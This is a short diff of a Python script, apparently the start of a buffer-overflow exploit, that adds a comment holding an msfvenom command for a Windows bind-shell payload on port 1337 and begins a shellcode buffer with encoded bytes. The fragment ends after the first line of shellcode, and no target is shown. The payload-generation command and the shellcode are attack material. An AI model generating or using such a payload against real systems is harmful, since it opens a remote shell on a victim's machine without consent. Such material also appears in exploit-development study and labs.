@@ -1,5 +1,6 @@
 import socket, os, sys
 
+#msfvenom -p windows/shell_bind_tcp LPORT=1337 -b "\x00\x0a\x0d" -f python     
 
 buf =  b""
 buf += b"\xbd\xc6\xfa\x85\x34\xda\xd8\xd9\x74\x24\xf4\x58\x2b"
